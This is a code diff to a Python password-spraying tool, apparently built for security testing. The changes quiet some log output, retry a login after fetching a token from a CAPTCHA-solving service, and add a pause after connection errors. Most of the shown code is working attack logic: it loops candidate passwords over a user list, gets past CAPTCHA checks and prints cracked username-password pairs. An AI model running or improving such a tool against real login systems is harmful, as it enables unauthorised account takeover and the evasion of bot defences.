@@ -76,7 +76,6 @@ def solve_captcha(config):
 
         if response.status_code == 200:
             token = response.json().get("captcha_token")
-            print(f"Solved CAPTCHA. Token: {token}")
             return token
         else:
             print(f"[ERROR] Failed to get CAPTCHA token. Status: {response.status_code}")
@@ -100,7 +99,6 @@ def attempt_login(config, username, password, attack_type):
             timeout=config.get("request_timeout", 5)
         )
         status_code = response.status_code
-        print(f"{response.status_code} | msg: {response.text}")
         if status_code == 200:
             result = "SUCCESS"
         elif status_code == 401:
@@ -116,16 +114,18 @@ def attempt_login(config, username, password, attack_type):
             if resp_json.get("captcha_required", False):
                 CAPTCHA_TOKEN = solve_captcha(config)
                 result = f"Solved CAPTCHA, CAPTCHA_TOKEN: {CAPTCHA_TOKEN}"
+                attempt_login(config, username, password, attack_type)
         except ValueError:
             pass
     except requests.exceptions.RequestException as e:
         print(f"Connection Error: {e}")
+        time.sleep(15)
 
     end_time = time.time()
     latency_ms = (end_time - start_time) * 1000
     log_attempt(config, username, password, status_code, result, latency_ms, attack_type)
 
-    print(f"Status: {status_code} | User: {username} | Pass: {password} | ({latency_ms:.3f}ms)")
+    # print(f"Status: {status_code} | User: {username} | Pass: {password} | ({latency_ms:.3f}ms)")
     return result == "SUCCESS"
 
 
@@ -159,18 +159,18 @@ def run_password_spraying(config):
             print("All users cracked! Stopping.")
             break
 
-        print(f"Spraying password: {password}")
+        # print(f"Spraying password: {password}")
 
         for user in list(active_users):
             is_success = attempt_login(config, user, password, "Password-Spraying")
 
             if is_success:
                 print(f"SUCCESS! LOGIN CREDS: {user} : {password}")
-                # הסרת המשתמש מהרשימה כדי לא לתקוף אותו שוב
+                # removing user from list after successfully logging in
                 active_users.remove(user)
 
     print("Password spraying attack finished")
-    print(f"Remaining uncracked users: {len(active_users)}")
+    print(f"Remaining uncracked users: {active_users}")
 
 
 if __name__ == "__main__":
